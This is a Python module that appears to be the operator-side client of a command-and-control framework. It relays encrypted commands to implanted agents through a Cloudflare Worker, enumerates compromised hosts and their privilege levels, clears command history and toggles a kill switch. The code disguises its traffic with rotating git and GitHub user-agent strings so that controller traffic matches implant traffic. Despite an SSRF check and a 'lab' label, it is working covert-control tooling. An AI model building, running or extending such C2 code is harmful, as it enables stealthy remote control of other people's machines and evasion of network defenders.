"""
Worker channel client — talks to the Cloudflare Worker relay (cloudflare-worker/).

Mirrors the GitHubClient surface the poller/sender/killswitch paths use:
  get_agents()                    discovery (parses the reg body like GitHub)
  get_comments(id, since)         [{"id": str(rowid), "body", "created_at"}]
  post_comment(id, body)          (ok, err)
  create_kill_signal()/deactivate_kill_signal()

Auth: shared secret header (X-C2-Auth) + the secret path prefix baked into the
Worker. Payloads themselves remain AES-256-GCM encrypted end to end.

Server-side request safety (lab constraint): every configured base URL must
be http/https and must resolve to a PUBLIC address — loopback, private and
link-local ranges are rejected at construction, redirects are never followed.
"""
import ipaddress
import random
import re
import socket
import time
from urllib.parse import urlparse

import requests

import crypto

_ALLOWED_SCHEMES = ("http", "https")


def _validate_base(base: str) -> str:
    """Return the normalized base or raise ValueError for unsafe targets."""
    p = urlparse(base)
    if p.scheme not in _ALLOWED_SCHEMES or not p.hostname:
        raise ValueError(f"worker url must be absolute http(s): {base!r}")
    try:
        infos = socket.getaddrinfo(p.hostname, p.port or (443 if p.scheme == "https" else 80),
                                   proto=socket.IPPROTO_TCP)
    except OSError as e:
        raise ValueError(f"worker url host unresolvable: {p.hostname} ({e})")
    for info in infos:
        ip = ipaddress.ip_address(info[4][0])
        if (ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved
                or ip.is_multicast or ip.is_unspecified):
            raise ValueError(f"worker url host resolves to a non-public address: {ip}")
    return base.strip().rstrip("/")


def validate_external_url(url: str) -> None:
    """Public SSRF guard for arbitrary download URLs (sendit relay etc.).

    Same rules as _validate_base: absolute http(s) + host must resolve to a
    public address. Raises ValueError on violation."""
    _validate_base(url)


class WorkerClient:
    def __init__(self, secret: str, urls, path_prefix: str = "", password: str = ""):
        self.secret = secret
        bases = [u for u in (x.strip() for x in urls.split(",")) if u]
        if not bases:
            raise ValueError("no worker urls configured")
        # Fail fast on unsafe/private targets (SSRF guard); public ones only.
        self.bases = [_validate_base(b) for b in bases]
        self.prefix = "/" + path_prefix.strip("/") if path_prefix.strip("/") else ""
        self.password = password
        self._last_error = ""
        self._pref = 0

    @staticmethod
    def _ua() -> str:
        # Mirror the agent's UA pool — controller egress must look identical
        # to implant egress on the wire.
        return random.choice([
            "git/2.39.2", "git/2.43.0",
            "go-github/60.0.0",
            "GitHub-Actions-Hookshot/1.0",
        ])

    def _req(self, method, path, json_body=None, timeout=25):
        """Try the preferred domain, fail over to the backup, stay sticky."""
        self._last_error = ""
        order = [self._pref] + [i for i in range(len(self.bases)) if i != self._pref]
        # 双域名 × 2 轮重试（轮间 1s 退避）——单遍即弃会让瞬时抖动直接变"无回显"
        last_err = ""
        for attempt in range(2):
            for idx in order:
                url = f"{self.bases[idx]}{path}"
                try:
                    r = requests.request(method, url, json=json_body, timeout=timeout,
                                         headers={"X-C2-Auth": self.secret,
                                                  "User-Agent": self._ua()},
                                         allow_redirects=False)
                    if r.status_code == 200:
                        self._pref = idx
                        return r
                    last_err = f"HTTP {r.status_code}: {r.text[:120]}"
                except Exception as e:
                    last_err = f"{type(e).__name__}: {e}"
            if attempt == 0:
                time.sleep(1)
        self._last_error = last_err
        return None

    # ── discovery ────────────────────────────────────────────────────────────

    def get_agents(self) -> list:
        r = self._req("GET", f"{self.prefix}/agents")
        if not r:
            return []
        agents = []
        for row in r.json():
            info = {"id": row.get("id", ""), "repo": "", "channel": "worker",
                    "agent_uuid": "", "hostname": "unknown", "username": "unknown",
                    "os": "unknown", "privilege": "unknown",
                    "version": "", "release_id": "",
                    # P2-9: read last_seen directly (was aliased as created_at
                    # in the SQL, which was semantically wrong)
                    "last_seen": row.get("last_seen", row.get("created_at", ""))}
            raw = row.get("body") or ""
            # Encrypted registration (stealth): decrypt with the channel
            # password; legacy plaintext rows still parse for compatibility.
            body = raw
            if raw and not raw.lstrip().startswith("Agent ID"):
                body = crypto.decrypt(raw, self.password) or ""
            for line in body.splitlines():
                m = re.match(r"(Agent ID|OS|Host|User|Version|Release):\s*(.+)", line.strip())
                if not m:
                    continue
                k, v = m.group(1), m.group(2).strip()
                if k == "Agent ID":
                    info["agent_uuid"] = v
                elif k == "OS":
                    info["os"] = v
                elif k == "Host":
                    info["hostname"] = v
                elif k == "User":
                    info["username"] = v
                    info["privilege"] = "root" if v == "root" else "user"
                elif k == "Version":
                    info["version"] = v
                elif k == "Release":
                    info["release_id"] = v
            agents.append(info)
        return agents

    # ── comments (GitHub-shaped) ─────────────────────────────────────────────

    def purge_comments(self, agent_id: str) -> tuple:
        """Delete ALL relay-side comments for an agent (history clear).

        Returns (deleted, supported). Old relays without the DELETE endpoint
        return 404/405 → supported=False so the caller can inform the operator
        to redeploy the relay via the ☁️ Worker card."""
        r = self._req("DELETE", f"{self.prefix}/comments/{agent_id}")
        if r is None:
            # 404/405 = 旧中继；网络失败同样不能当「已清」，否则 Agent 会重跑 D1 旧令
            return 0, False
        try:
            body = r.json()
            return int(body.get("deleted", 0)), True
        except Exception:
            return 0, True

    def get_comments(self, agent_id: str, since=None):
        try:
            since_n = int(since or 0)
        except (TypeError, ValueError):
            since_n = 0
        r = self._req("GET", f"{self.prefix}/c2d/{agent_id}?since={since_n}")
        if not r:
            return []
        return [{"id": str(c["id"]), "body": c.get("body", ""),
                 "created_at": c.get("created_at", "")}
                for c in r.json().get("comments", [])]

    def post_comment(self, agent_id: str, body: str):
        r = self._req("POST", f"{self.prefix}/c2d/{agent_id}", {"body": body})
        if not r:
            return False, self._last_error or "worker request failed"
        return True, ""

    # ── kill switch ──────────────────────────────────────────────────────────

    def create_kill_signal(self) -> bool:
        return bool(self._req("POST", f"{self.prefix}/kill"))

    def kill_status(self) -> dict:
        r = self._req("GET", f"{self.prefix}/kill")
        if not r:
            return {"active": False, "raised_at": None}
        try:
            return r.json()
        except ValueError:
            return {"active": False, "raised_at": None}

    def deactivate_kill_signal(self) -> bool:
        return bool(self._req("DELETE", f"{self.prefix}/kill"))
